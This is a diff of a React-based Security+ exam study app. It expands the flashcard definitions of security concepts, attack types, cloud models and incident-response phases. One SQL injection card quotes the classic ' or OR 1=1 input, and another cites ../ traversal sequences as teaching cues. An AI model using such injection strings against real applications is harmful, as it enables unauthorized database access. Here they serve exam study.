@@ -8,429 +8,633 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
   <meta name="apple-mobile-web-app-title" content="Sec+ Study" />
   <title>Security+ Study Hub</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet" />
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-    body { background: #050d18; font-family: 'DM Sans', sans-serif; color: #e2e8f0; overflow-x: hidden; }
-    ::-webkit-scrollbar { display: none; }
-    button { transition: opacity 0.1s; cursor: pointer; }
-    button:active { opacity: 0.7; }
-    .scroll-x { display: flex; gap: 6px; overflow-x: auto; padding-bottom: 12px; scrollbar-width: none; }
-    .scroll-x::-webkit-scrollbar { display: none; }
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+    body{background:#050d18;font-family:'DM Sans',sans-serif;color:#e2e8f0;overflow-x:hidden}
+    ::-webkit-scrollbar{display:none}
+    button{transition:opacity .1s;cursor:pointer}
+    button:active{opacity:.7}
+    .sx{display:flex;gap:6px;overflow-x:auto;padding-bottom:10px;scrollbar-width:none}
+    .sx::-webkit-scrollbar{display:none}
   </style>
 </head>
 <body>
 <div id="root"></div>
-
 <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
 <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
 <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-
 <script type="text/babel">
-const { useState, useEffect, useRef } = React;
+const {useState,useEffect}=React;
 
-// ─── DATA ────────────────────────────────────────────────────────────────────
-
-const DOMAINS = [
-  { id: 1, name: "General Security Concepts", weight: 12, color: "#00d4ff" },
-  { id: 2, name: "Threats, Vulnerabilities & Mitigations", weight: 22, color: "#ff4d6d" },
-  { id: 3, name: "Security Architecture", weight: 18, color: "#06d6a0" },
-  { id: 4, name: "Security Operations", weight: 28, color: "#f9c74f" },
-  { id: 5, name: "Security Program Management", weight: 20, color: "#a855f7" },
+const DOMAINS=[
+  {id:1,name:"General Security Concepts",weight:12,color:"#00d4ff"},
+  {id:2,name:"Threats, Vulnerabilities & Mitigations",weight:22,color:"#ff4d6d"},
+  {id:3,name:"Security Architecture",weight:18,color:"#06d6a0"},
+  {id:4,name:"Security Operations",weight:28,color:"#f9c74f"},
+  {id:5,name:"Security Program Management",weight:20,color:"#a855f7"},
 ];
 
-const FLASHCARDS = [
-  { term: "CIA Triad", def: "Confidentiality, Integrity, Availability — the three core security principles", domain: 1 },
-  { term: "Least Privilege", def: "Users get only the minimum access needed to perform their job duties", domain: 1 },
-  { term: "Separation of Duties", def: "Critical tasks split across multiple people to prevent fraud or abuse", domain: 1 },
-  { term: "Dual Control", def: "Two people must be physically present simultaneously for sensitive actions", domain: 1 },
-  { term: "Need to Know", def: "Access only if required for a specific task — even with clearance", domain: 1 },
-  { term: "Zero Trust", def: "Never trust, always verify — no implicit trust based on network location", domain: 1 },
-  { term: "MFA", def: "Multi-Factor Authentication — requires 2+ different factor types", domain: 1 },
-  { term: "Symmetric Encryption", def: "One shared key encrypts and decrypts — fast, used for bulk data (AES, 3DES)", domain: 1 },
-  { term: "Asymmetric Encryption", def: "Public/private key pair — slow, used for key exchange and signatures (RSA, ECC)", domain: 1 },
-  { term: "Hashing", def: "One-way transformation producing a fixed-length digest — cannot be reversed", domain: 1 },
-  { term: "Salting", def: "Adding random data before hashing — defeats rainbow table attacks", domain: 1 },
-  { term: "Digital Signature", def: "Hash encrypted with sender's PRIVATE key — proves authenticity and integrity", domain: 1 },
-  { term: "Perfect Forward Secrecy", def: "Unique session keys per session — past sessions stay secure if key is compromised", domain: 1 },
-  { term: "PKI", def: "Public Key Infrastructure — manages digital certificates and certificate authorities", domain: 1 },
-  { term: "Kerberos", def: "Ticket-based auth using Key Distribution Center (KDC) — used in Active Directory", domain: 1 },
-  { term: "SAML", def: "XML-based SSO for enterprise federation between organizations", domain: 1 },
-  { term: "OAuth 2.0", def: "Delegated authorization — allows 'Login with Google/Facebook' type flows", domain: 1 },
-  { term: "RADIUS", def: "Centralized auth for VPN and Wi-Fi — uses UDP", domain: 1 },
-  { term: "TACACS+", def: "Cisco AAA protocol separating authn/authz/accounting — uses TCP", domain: 1 },
-  { term: "RBAC", def: "Role-Based Access Control — access granted based on job role", domain: 1 },
-  { term: "ABAC", def: "Attribute-Based Access Control — access based on attributes (location, dept, time)", domain: 1 },
-  { term: "DAC", def: "Discretionary Access Control — data OWNER decides who gets access (NTFS)", domain: 1 },
-  { term: "MAC", def: "Mandatory Access Control — labels and clearances enforced by the SYSTEM (military)", domain: 1 },
-  { term: "Non-repudiation", def: "Sender cannot deny sending — provided by digital signatures", domain: 1 },
-  { term: "HSM", def: "Hardware Security Module — dedicated hardware for cryptographic key storage", domain: 1 },
-  { term: "Phishing", def: "Mass email impersonating trusted entity — generic, untargeted", domain: 2 },
-  { term: "Spear Phishing", def: "Targeted phishing at a specific individual using personal details", domain: 2 },
-  { term: "Whaling", def: "Spear phishing targeting executives — CEO, CFO, board members", domain: 2 },
-  { term: "Vishing", def: "Voice/phone-based phishing — impersonates IT support, bank, IRS", domain: 2 },
-  { term: "Smishing", def: "SMS-based phishing — text messages with malicious links", domain: 2 },
-  { term: "Pretexting", def: "Creating a fake scenario to extract info — impersonating IT support", domain: 2 },
-  { term: "Typosquatting", def: "Registering misspelled domains to catch URL typos (arnazon.com)", domain: 2 },
-  { term: "Watering Hole", def: "Compromising a website frequently visited by the target group", domain: 2 },
-  { term: "Rootkit", def: "Hides deep in OS/kernel — evades AV, survives reboots, requires reimaging", domain: 2 },
-  { term: "Ransomware", def: "Encrypts files and demands payment — restore from clean verified backup", domain: 2 },
-  { term: "Cryptojacking", def: "Uses victim CPU to mine cryptocurrency — 100% CPU + mining pool connections", domain: 2 },
-  { term: "Logic Bomb", def: "Triggers malicious action on a condition or date — often planted by insiders", domain: 2 },
-  { term: "APT", def: "Advanced Persistent Threat — sophisticated, long-term stealthy attack (nation-state)", domain: 2 },
-  { term: "SYN Flood", def: "DoS sending half-open TCP connections to exhaust server connection table", domain: 2 },
-  { term: "Evil Twin", def: "Fake AP mimicking legitimate SSID — intercepts connecting users' credentials", domain: 2 },
-  { term: "Rogue Access Point", def: "Unauthorized AP physically connected to internal network — creates backdoor", domain: 2 },
-  { term: "SQL Injection", def: "Malicious SQL in input fields to manipulate database — look for ' or OR 1=1", domain: 2 },
-  { term: "XSS", def: "Cross-Site Scripting — injects malicious scripts into pages viewed by other users", domain: 2 },
-  { term: "CSRF", def: "Tricks authenticated user into making unwanted requests — fixed with CSRF tokens", domain: 2 },
-  { term: "MitM", def: "Man-in-the-Middle — intercepts, reads, re-encrypts, forwards live communication", domain: 2 },
-  { term: "Replay Attack", def: "Captures valid auth token and retransmits it LATER — not a live session", domain: 2 },
-  { term: "Pass-the-Hash", def: "Reuses stolen NTLM hash to authenticate without cracking the password", domain: 2 },
-  { term: "DMZ", def: "Demilitarized Zone — buffer network hosting public-facing servers between internet and LAN", domain: 3 },
-  { term: "IDS vs IPS", def: "IDS monitors and ALERTS only (passive) — IPS monitors and BLOCKS (active, inline)", domain: 3 },
-  { term: "WAF", def: "Web Application Firewall — filters HTTP/HTTPS, protects against SQLi and XSS", domain: 3 },
-  { term: "RTO", def: "Recovery Time Objective — maximum acceptable system downtime after an incident", domain: 3 },
-  { term: "RPO", def: "Recovery Point Objective — maximum acceptable data loss measured in time", domain: 3 },
-  { term: "Hot Site", def: "Fully operational backup site with real-time sync — fastest recovery, highest cost", domain: 3 },
-  { term: "Warm Site", def: "Partially equipped backup — restore from backup needed, medium cost and speed", domain: 3 },
-  { term: "Cold Site", def: "Empty facility, equipment must be installed — cheapest, slowest (days to weeks)", domain: 3 },
-  { term: "VM Escape", def: "Attacker breaks out of virtual machine to access host or other VMs", domain: 3 },
-  { term: "IaaS", def: "Infrastructure as a Service — provider owns hardware; customer owns OS, apps, data", domain: 3 },
-  { term: "PaaS", def: "Platform as a Service — provider owns OS/runtime; customer owns apps and data", domain: 3 },
-  { term: "SaaS", def: "Software as a Service — provider owns everything; customer owns data and config", domain: 3 },
-  { term: "IR Phases", def: "Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned", domain: 4 },
-  { term: "Order of Volatility", def: "CPU cache → RAM → Swap files → Hard drive → Archived logs (most to least volatile)", domain: 4 },
-  { term: "Chain of Custody", def: "Documented record of who handled evidence and when — maintains forensic integrity", domain: 4 },
-  { term: "SIEM", def: "Security Information and Event Management — collects and correlates logs centrally", domain: 4 },
-  { term: "SOAR", def: "Security Orchestration, Automation & Response — automates IR playbooks", domain: 4 },
-  { term: "UEBA", def: "User Entity Behavior Analytics — baselines normal behavior, flags anomalies", domain: 4 },
-  { term: "EDR", def: "Endpoint Detection and Response — monitors, detects, investigates endpoint threats", domain: 4 },
-  { term: "Privilege Creep", def: "Accumulation of permissions over time beyond current role — fixed by access reviews", domain: 4 },
-  { term: "JIT Access", def: "Just-in-Time — temporary elevated access granted only when needed, auto-revoked after", domain: 4 },
-  { term: "Risk Formula", def: "Risk = Likelihood × Impact", domain: 5 },
-  { term: "ALE", def: "Annual Loss Expectancy = SLE × ARO — expected yearly financial loss from a risk", domain: 5 },
-  { term: "NIST CSF", def: "Cybersecurity Framework: Identify, Protect, Detect, Respond, Recover", domain: 5 },
-  { term: "GDPR", def: "EU regulation giving citizens rights over personal data — includes right to be forgotten", domain: 5 },
-  { term: "Supply Chain Attack", def: "Compromising a vendor or software update to attack downstream targets (SolarWinds)", domain: 5 },
-  { term: "Risk Transference", def: "Shift risk to third party — cyber insurance is the classic example", domain: 5 },
-  { term: "Due Diligence", def: "Investigation and research BEFORE entering a business relationship", domain: 5 },
-  { term: "Due Care", def: "Ongoing steps to MAINTAIN security after due diligence is performed", domain: 5 },
+// ── 225 FLASHCARDS ────────────────────────────────────────────────────────────
+const FLASHCARDS=[
+// Domain 1 — 55 cards
+{term:"CIA Triad",def:"Confidentiality, Integrity, Availability — the three core information security principles",domain:1},
+{term:"Confidentiality",def:"Ensuring data is accessible only to authorized parties — protected by encryption and access controls",domain:1},
+{term:"Integrity",def:"Ensuring data is accurate and unaltered — verified by hashing, checksums, digital signatures",domain:1},
+{term:"Availability",def:"Ensuring systems and data are accessible when needed — supported by redundancy, backups, uptime SLAs",domain:1},
+{term:"Least Privilege",def:"Users receive only the minimum access required to perform their specific job duties — nothing more",domain:1},
+{term:"Separation of Duties",def:"Critical tasks are split across multiple people so no single person can commit fraud alone",domain:1},
+{term:"Dual Control",def:"Two authorized people must be SIMULTANEOUSLY PRESENT to perform a sensitive action",domain:1},
+{term:"Job Rotation",def:"Employees rotate roles periodically — reduces insider threat risk and exposes misconduct",domain:1},
+{term:"Need to Know",def:"Access granted only when required for a specific task — even if the user has sufficient clearance",domain:1},
+{term:"Zero Trust",def:"'Never trust, always verify' — every access request is authenticated regardless of network location",domain:1},
+{term:"Defense in Depth",def:"Multiple layered security controls so if one fails, others still protect — no single point of failure",domain:1},
+{term:"Non-repudiation",def:"Sender cannot deny sending a message — achieved through digital signatures using the private key",domain:1},
+{term:"AAA Framework",def:"Authentication (prove identity), Authorization (what you can do), Accounting (log what you did)",domain:1},
+{term:"Identification",def:"Claiming an identity — providing a username. NOT proving it",domain:1},
+{term:"Authentication",def:"PROVING the claimed identity — password, biometric, token",domain:1},
+{term:"Authorization",def:"Determining what an authenticated user is ALLOWED to access or do",domain:1},
+{term:"Accounting",def:"Logging and tracking user activity — audit trails, SIEM records, access logs",domain:1},
+{term:"MFA",def:"Multi-Factor Authentication — requires 2+ DIFFERENT factor types (know + have + are)",domain:1},
+{term:"Something You Know",def:"Knowledge factor — passwords, PINs, security questions",domain:1},
+{term:"Something You Have",def:"Possession factor — smart card, hardware token, OTP app, phone",domain:1},
+{term:"Something You Are",def:"Inherence factor — biometrics: fingerprint, retina scan, facial recognition",domain:1},
+{term:"Somewhere You Are",def:"Location factor — GPS coordinates, IP address geofencing",domain:1},
+{term:"Symmetric Encryption",def:"One shared key encrypts AND decrypts — fast, ideal for bulk data (AES, 3DES, RC4)",domain:1},
+{term:"Asymmetric Encryption",def:"Public key encrypts, private key decrypts — slow, used for key exchange and signatures (RSA, ECC)",domain:1},
+{term:"AES",def:"Advanced Encryption Standard — symmetric, strongest common standard (128/192/256-bit keys)",domain:1},
+{term:"RSA",def:"Asymmetric algorithm using large prime factorization — common for key exchange and digital signatures",domain:1},
+{term:"ECC",def:"Elliptic Curve Cryptography — asymmetric, smaller keys with same strength as RSA, used on mobile",domain:1},
+{term:"Diffie-Hellman",def:"Key exchange protocol allowing two parties to establish a shared secret over an insecure channel",domain:1},
+{term:"Hashing",def:"One-way transformation producing a fixed-length digest — cannot be reversed to original data",domain:1},
+{term:"MD5",def:"128-bit hash — broken, vulnerable to collisions. Do NOT use for security purposes",domain:1},
+{term:"SHA-1",def:"160-bit hash — deprecated, vulnerable to collision attacks. Avoid in modern systems",domain:1},
+{term:"SHA-256",def:"256-bit hash from SHA-2 family — current standard, collision resistant, widely used",domain:1},
+{term:"Salting",def:"Adding a unique random value to each password before hashing — defeats rainbow table attacks",domain:1},
+{term:"Rainbow Table Attack",def:"Using precomputed hash-to-plaintext tables to crack stolen password hashes — defeated by salting",domain:1},
+{term:"Digital Signature",def:"Hash of a message encrypted with sender's PRIVATE key — proves authenticity and integrity",domain:1},
+{term:"Certificate Authority (CA)",def:"Trusted entity that issues, signs, and manages digital certificates — root of PKI trust",domain:1},
+{term:"PKI",def:"Public Key Infrastructure — system of CAs, certificates, and processes managing asymmetric keys",domain:1},
+{term:"Digital Certificate",def:"Binds a public key to an identity — signed by a CA, used in HTTPS/TLS",domain:1},
+{term:"Perfect Forward Secrecy",def:"Generates unique session keys per session — past sessions stay secure even if server key is compromised later",domain:1},
+{term:"HSM",def:"Hardware Security Module — dedicated tamper-resistant hardware for cryptographic key storage and operations",domain:1},
+{term:"Key Escrow",def:"Encryption keys held by a trusted third party — allows lawful recovery of encrypted data",domain:1},
+{term:"RADIUS",def:"Remote Authentication Dial-In User Service — centralized auth for VPN/Wi-Fi, uses UDP",domain:1},
+{term:"TACACS+",def:"Cisco protocol separating Authentication, Authorization, Accounting into three functions — uses TCP",domain:1},
+{term:"LDAP",def:"Lightweight Directory Access Protocol — queries and maintains directory info (NOT authentication itself)",domain:1},
+{term:"Kerberos",def:"Ticket-based authentication using KDC — authenticates once, accesses multiple internal services",domain:1},
+{term:"KDC",def:"Key Distribution Center — Kerberos component issuing Ticket Granting Tickets (TGTs)",domain:1},
+{term:"SAML",def:"Security Assertion Markup Language — XML-based SSO standard for enterprise federation between organizations",domain:1},
+{term:"OAuth 2.0",def:"Open Authorization — delegated authorization protocol enabling 'Login with Google' flows",domain:1},
+{term:"OpenID Connect",def:"Authentication layer built on top of OAuth 2.0 — adds identity verification to OAuth",domain:1},
+{term:"SSO",def:"Single Sign-On — authenticate once, access many applications without re-entering credentials",domain:1},
+{term:"DAC",def:"Discretionary Access Control — resource OWNER decides who gets access (e.g. NTFS file permissions)",domain:1},
+{term:"MAC",def:"Mandatory Access Control — system enforces access via security labels and clearances (military/government)",domain:1},
+{term:"RBAC",def:"Role-Based Access Control — access granted based on job role, not individual identity",domain:1},
+{term:"ABAC",def:"Attribute-Based Access Control — access based on multiple attributes: role, location, time, department",domain:1},
+{term:"Rule-Based Access Control",def:"Admin-defined rules grant or deny access — firewall ACLs, time-of-day restrictions",domain:1},
+// Domain 2 — 60 cards
+{term:"Phishing",def:"Mass email impersonating trusted entity — generic, untargeted ('Dear Customer')",domain:2},
+{term:"Spear Phishing",def:"Targeted phishing using victim's personal details — name, employer, recent projects",domain:2},
+{term:"Whaling",def:"Spear phishing targeting executives — CEO, CFO, board members",domain:2},
+{term:"Vishing",def:"Voice/phone-based phishing — caller impersonates IT helpdesk, bank, or IRS",domain:2},
+{term:"Smishing",def:"SMS-based phishing — text messages containing malicious links",domain:2},
+{term:"Pretexting",def:"Creating a fabricated scenario to manipulate a victim into revealing info",domain:2},
+{term:"Baiting",def:"Leaving infected USB drives in public hoping someone plugs them in",domain:2},
+{term:"Tailgating",def:"Following an authorized person through a secure door without badging in",domain:2},
+{term:"Typosquatting",def:"Registering misspelled domain names to intercept mistyped URLs (arnazon.com)",domain:2},
+{term:"Watering Hole",def:"Compromising a website frequently visited by the target group to deliver malware",domain:2},
+{term:"Business Email Compromise",def:"Attacker impersonates executive via email to authorize fraudulent wire transfers",domain:2},
+{term:"Virus",def:"Attaches to legitimate files and spreads when executed — requires user action to propagate",domain:2},
+{term:"Worm",def:"Self-replicates across networks without user interaction — spreads autonomously",domain:2},
+{term:"Trojan",def:"Disguised as legitimate software — no self-replication, relies on deceiving the user",domain:2},
+{term:"Ransomware",def:"Encrypts victim files and demands payment for decryption key — restore from clean backup",domain:2},
+{term:"Spyware",def:"Secretly monitors and transmits user activity — keystrokes, browsing, screenshots",domain:2},
+{term:"Adware",def:"Displays unwanted advertisements — often bundled with free software",domain:2},
+{term:"Rootkit",def:"Installs at kernel level, hides itself from OS and AV tools — requires reimaging to remove",domain:2},
+{term:"Botnet",def:"Network of compromised machines (bots) controlled by a C2 server for DDoS, spam, or mining",domain:2},
+{term:"Cryptojacking",def:"Secretly uses victim's CPU to mine cryptocurrency — indicator: unexplained 100% CPU usage",domain:2},
+{term:"Logic Bomb",def:"Malicious code triggered by a specific condition or date — often planted by disgruntled insiders",domain:2},
+{term:"Backdoor",def:"Hidden access mechanism bypassing normal authentication — allows persistent unauthorized access",domain:2},
+{term:"Keylogger",def:"Records every keystroke to capture passwords, credit cards, and sensitive data",domain:2},
+{term:"Fileless Malware",def:"Operates entirely in memory — no files written to disk, evades signature-based AV",domain:2},
+{term:"APT",def:"Advanced Persistent Threat — sophisticated, long-term, stealthy attack often attributed to nation-states",domain:2},
+{term:"Zero-Day",def:"Vulnerability exploited before the vendor has released a patch — no defense available at time of attack",domain:2},
+{term:"IOC",def:"Indicator of Compromise — evidence suggesting a system is compromised (unusual traffic, new admin accounts)",domain:2},
+{term:"TTPs",def:"Tactics, Techniques, Procedures — patterns describing how a threat actor operates",domain:2},
+{term:"OSINT",def:"Open Source Intelligence — gathering information about targets from publicly available sources",domain:2},
+{term:"SYN Flood",def:"DoS attack sending millions of half-open TCP connections — exhausts server connection table",domain:2},
+{term:"Smurf Attack",def:"Sends ICMP echo requests to broadcast address with spoofed victim IP — victim flooded with replies",domain:2},
+{term:"Ping of Death",def:"Sends oversized/malformed ICMP packets causing target system to crash",domain:2},
+{term:"DNS Amplification",def:"Small DNS query generates large response directed at victim — amplifies attack traffic volume",domain:2},
+{term:"DDoS",def:"Distributed Denial of Service — attack from many sources simultaneously, harder to block",domain:2},
+{term:"Evil Twin",def:"Rogue AP mimicking a legitimate Wi-Fi SSID to intercept credentials of connecting users",domain:2},
+{term:"Rogue Access Point",def:"Unauthorized AP physically plugged into the internal network — creates an unsecured entry point",domain:2},
+{term:"Deauthentication Attack",def:"Forces clients off a legitimate AP using spoofed management frames — often used to push to Evil Twin",domain:2},
+{term:"War Driving",def:"Driving around scanning for unsecured wireless networks using a laptop and antenna",domain:2},
+{term:"MitM",def:"Man-in-the-Middle — attacker intercepts, reads, re-encrypts, and forwards live communication",domain:2},
+{term:"Replay Attack",def:"Captures valid authentication token and retransmits it LATER — not a live session takeover",domain:2},
+{term:"Session Hijacking",def:"Steals active session cookie to take over a LIVE authenticated session in real time",domain:2},
+{term:"SSL Stripping",def:"Downgrades HTTPS to HTTP — user believes they're secure but connection is unencrypted",domain:2},
+{term:"ARP Poisoning",def:"Sends fake ARP replies associating attacker MAC with legitimate IP — enables MitM on LAN",domain:2},
+{term:"DNS Poisoning",def:"Corrupts DNS cache to redirect legitimate domain lookups to malicious IP addresses",domain:2},
+{term:"Pass-the-Hash",def:"Reuses stolen NTLM hash to authenticate to systems without cracking the actual password",domain:2},
+{term:"Kerberoasting",def:"Requests Kerberos service tickets and cracks them offline — targets service accounts",domain:2},
+{term:"Golden Ticket Attack",def:"Forges Kerberos TGT using stolen KRBTGT hash — grants persistent domain admin access",domain:2},
+{term:"SQL Injection",def:"Injects malicious SQL into input fields to manipulate the backend database — look for ' or OR 1=1",domain:2},
+{term:"Stored XSS",def:"Malicious script stored in database and executed every time the page loads for other users",domain:2},
+{term:"Reflected XSS",def:"Malicious script embedded in URL — reflected off the server and executed in victim's browser",domain:2},
+{term:"CSRF",def:"Cross-Site Request Forgery — tricks authenticated user into unknowingly submitting malicious requests",domain:2},
+{term:"Directory Traversal",def:"Uses ../ sequences to access files outside the web root directory",domain:2},
+{term:"Buffer Overflow",def:"Input exceeds buffer size, overwriting adjacent memory — can allow code execution",domain:2},
+{term:"Race Condition",def:"Two processes access the same resource simultaneously causing unpredictable behavior",domain:2},
+{term:"Privilege Escalation",def:"Gaining higher permissions than authorized — vertical (user to admin) or horizontal (user to user)",domain:2},
+{term:"Credential Stuffing",def:"Automating login attempts using breached username/password pairs from other sites",domain:2},
+{term:"Brute Force Attack",def:"Trying every possible password combination until the correct one is found",domain:2},
+{term:"Dictionary Attack",def:"Using a list of common words and passwords to guess credentials — faster than pure brute force",domain:2},
+{term:"Threat Actor Types",def:"Nation-State (high skill), Organized Crime (financial), Hacktivist (political), Script Kiddie (low skill)",domain:2},
+// Domain 3 — 45 cards
+{term:"DMZ",def:"Demilitarized Zone — buffer network between internet and internal LAN hosting public-facing servers",domain:3},
+{term:"Network Segmentation",def:"Dividing a network into isolated zones to limit lateral movement after a breach",domain:3},
+{term:"VLAN",def:"Virtual LAN — logical Layer 2 network segment without requiring physical separation",domain:3},
+{term:"Air Gap",def:"Physically isolated network with zero external connections — used for critical/classified systems",domain:3},
+{term:"Microsegmentation",def:"Fine-grained Zero Trust segmentation at workload/application level — limits blast radius",domain:3},
+{term:"Zero Trust Architecture",def:"Every access request verified regardless of origin — 'never trust, always verify' at network scale",domain:3},
+{term:"Firewall",def:"Filters network traffic based on rules — stateful tracks connection state, stateless checks each packet",domain:3},
+{term:"NGFW",def:"Next-Generation Firewall — adds deep packet inspection, application awareness, and IPS to traditional firewall",domain:3},
+{term:"IDS",def:"Intrusion Detection System — monitors traffic and ALERTS on suspicious patterns but does NOT block",domain:3},
+{term:"IPS",def:"Intrusion Prevention System — monitors traffic and ACTIVELY BLOCKS malicious traffic inline",domain:3},
+{term:"WAF",def:"Web Application Firewall — filters HTTP/HTTPS protecting against SQLi, XSS, CSRF at Layer 7",domain:3},
+{term:"Proxy Server",def:"Intermediary between client and internet — caches content, filters traffic, hides internal IPs",domain:3},
+{term:"Reverse Proxy",def:"Sits in front of servers — load balances, caches, and hides internal server architecture",domain:3},
+{term:"Honeypot",def:"Decoy system designed to attract, detect, and study attacker behavior",domain:3},
+{term:"Honeynet",def:"Network of honeypots with decoy credentials and fake systems — broader deception deployment",domain:3},
+{term:"Load Balancer",def:"Distributes incoming traffic across multiple servers — improves availability and performance",domain:3},
+{term:"Hypervisor Type 1",def:"Bare-metal hypervisor running directly on hardware — more secure (VMware ESXi, Hyper-V)",domain:3},
+{term:"Hypervisor Type 2",def:"Hosted hypervisor running on top of an OS — less secure (VirtualBox, VMware Workstation)",domain:3},
+{term:"VM Escape",def:"Vulnerability allowing attacker to break out of a VM and access the host or other VMs",domain:3},
+{term:"Container",def:"Lightweight application isolation sharing host OS kernel — more portable than VMs (Docker, Kubernetes)",domain:3},
+{term:"Container Breakout",def:"Attacker escapes container isolation to access host OS or other containers",domain:3},
+{term:"Serverless",def:"Cloud model where vendor manages all infrastructure — customer deploys only code/functions",domain:3},
+{term:"IaaS",def:"Infrastructure as a Service — provider: hardware. Customer: OS, patching, apps, data, identity",domain:3},
+{term:"PaaS",def:"Platform as a Service — provider: OS + runtime. Customer: applications and data only",domain:3},
+{term:"SaaS",def:"Software as a Service — provider: everything. Customer: data and access management",domain:3},
+{term:"Shared Responsibility Model",def:"Cloud security obligations split between provider and customer — varies by service model (IaaS/PaaS/SaaS)",domain:3},
+{term:"CASB",def:"Cloud Access Security Broker — monitors and controls cloud app usage, enforces security policies",domain:3},
+{term:"SASE",def:"Secure Access Service Edge — combines networking and security functions in a cloud-delivered service",domain:3},
+{term:"SD-WAN",def:"Software-Defined WAN — virtualizes WAN connections, centrally managed, often with built-in security",domain:3},
+{term:"RTO",def:"Recovery Time Objective — maximum acceptable time systems can be down after an incident",domain:3},
+{term:"RPO",def:"Recovery Point Objective — maximum acceptable data loss measured in time",domain:3},
+{term:"MTTR",def:"Mean Time To Repair — average time to restore a failed system or component",domain:3},
+{term:"MTBF",def:"Mean Time Between Failures — average time between system failures; higher = more reliable",domain:3},
+{term:"MTD",def:"Maximum Tolerable Downtime — absolute maximum time a process can be disrupted before critical impact",domain:3},
+{term:"Hot Site",def:"Fully operational backup site with real-time data sync — fastest recovery, highest cost (minutes to hours)",domain:3},
+{term:"Warm Site",def:"Partially equipped site — data restored from backup needed (hours to days), medium cost",domain:3},
+{term:"Cold Site",def:"Empty facility requiring full equipment installation — cheapest but slowest recovery (days to weeks)",domain:3},
+{term:"Full Backup",def:"Copies ALL data every time — slowest to create, fastest to restore",domain:3},
+{term:"Incremental Backup",def:"Backs up changes since last backup of ANY type — fastest to create, slowest to restore (need full chain)",domain:3},
+{term:"Differential Backup",def:"Backs up changes since last FULL backup — medium speed both ways (only need latest + last full)",domain:3},
+{term:"RAID",def:"Redundant Array of Independent Disks — combines drives for redundancy or performance (RAID 1=mirror, RAID 5=stripe+parity)",domain:3},
+{term:"Geographic Dispersal",def:"Storing data and systems across multiple physical locations to survive regional disasters",domain:3},
+{term:"Power Redundancy",def:"UPS + backup generators ensure continuous power during outages — part of availability controls",domain:3},
+{term:"Change Management",def:"Formal process controlling how changes are made to IT systems — prevents unauthorized or untested changes",domain:3},
+{term:"Secure Baseline",def:"Hardened standard configuration applied to all systems — removes unnecessary services and features",domain:3},
+// Domain 4 — 45 cards
+{term:"Incident Response",def:"Structured approach to handling security incidents: Prepare → Detect → Contain → Eradicate → Recover → Learn",domain:4},
+{term:"CSIRT",def:"Computer Security Incident Response Team — dedicated team handling security incidents",domain:4},
+{term:"Preparation Phase",def:"IR phase: build capability BEFORE incidents — policies, playbooks, training, tools",domain:4},
+{term:"Detection & Analysis",def:"IR phase: identify and confirm an incident — SIEM alerts, log review, IOC matching",domain:4},
+{term:"Containment",def:"IR phase: STOP the spread — isolate systems, block IPs, disable compromised accounts",domain:4},
+{term:"Eradication",def:"IR phase: REMOVE the threat — delete malware, close vulnerabilities, patch systems",domain:4},
+{term:"Recovery",def:"IR phase: RESTORE operations — from clean backup, verify integrity, monitor closely",domain:4},
+{term:"Lessons Learned",def:"IR phase: post-incident review — improve playbooks, update training, document findings",domain:4},
+{term:"Order of Volatility",def:"CPU cache → RAM → Swap/Temp → Hard drive → Archived logs (most to least volatile — collect first to last)",domain:4},
+{term:"Chain of Custody",def:"Documented record of who collected, handled, and transferred evidence — maintains forensic integrity",domain:4},
+{term:"Legal Hold",def:"Formal preservation order requiring all relevant data to be retained — cannot be deleted",domain:4},
+{term:"Write Blocker",def:"Hardware/software device preventing writes to storage media during forensic imaging",domain:4},
+{term:"Forensic Image",def:"Bit-for-bit copy of storage media — work on the copy, never the original",domain:4},
+{term:"Evidence Hashing",def:"Computing MD5/SHA hash of evidence at collection — proves it was not tampered with later",domain:4},
+{term:"eDiscovery",def:"Process of identifying, collecting, and producing electronically stored information for legal proceedings",domain:4},
+{term:"SIEM",def:"Security Information and Event Management — aggregates logs from all sources, correlates events, generates alerts",domain:4},
+{term:"SOAR",def:"Security Orchestration, Automation & Response — automates repetitive IR tasks and playbooks",domain:4},
+{term:"UEBA",def:"User and Entity Behavior Analytics — establishes behavioral baselines, flags deviations like impossible travel",domain:4},
+{term:"SOC",def:"Security Operations Center — team monitoring security events and responding to incidents 24/7",domain:4},
+{term:"NetFlow",def:"Network traffic metadata (not full packet capture) — who talked to whom, when, how much data",domain:4},
+{term:"Full Packet Capture",def:"Captures entire packet contents including payload — most detailed but most storage-intensive",domain:4},
+{term:"Syslog",def:"Standard protocol for sending log data to a centralized log server",domain:4},
+{term:"Threat Hunting",def:"Proactive search for threats already inside the network before any alert is triggered",domain:4},
+{term:"Penetration Testing",def:"Authorized exploitation of systems to demonstrate real-world impact of vulnerabilities",domain:4},
+{term:"Vulnerability Scanning",def:"Automated, non-invasive identification of known vulnerabilities — does not exploit",domain:4},
+{term:"Tabletop Exercise",def:"Discussion-based IR simulation — team walks through scenarios without touching real systems",domain:4},
+{term:"Red Team",def:"Simulates a sophisticated adversary using all attack vectors over extended time — stealth-focused",domain:4},
+{term:"Blue Team",def:"Defenders — monitors, detects, and responds to threats in real time",domain:4},
+{term:"Purple Team",def:"Red and Blue teams working together — Red attacks, Blue defends, both share findings to improve",domain:4},
+{term:"Bug Bounty",def:"Program rewarding external researchers for responsibly disclosing vulnerabilities",domain:4},
+{term:"DAC access model",def:"Discretionary — owner of the resource controls who can access it",domain:4},
+{term:"MAC access model",def:"Mandatory — system enforces access based on classification labels and user clearances",domain:4},
+{term:"RBAC access model",def:"Role-Based — permissions assigned to roles, users assigned to roles",domain:4},
+{term:"ABAC access model",def:"Attribute-Based — combines user attributes, resource attributes, and environment conditions",domain:4},
+{term:"Provisioning",def:"Creating user accounts and granting appropriate access when a user joins an organization",domain:4},
+{term:"Deprovisioning",def:"Revoking all access when a user leaves — prevents ghost accounts and unauthorized access",domain:4},
+{term:"Privilege Creep",def:"Accumulation of excessive permissions over time as user changes roles — fixed by access reviews",domain:4},
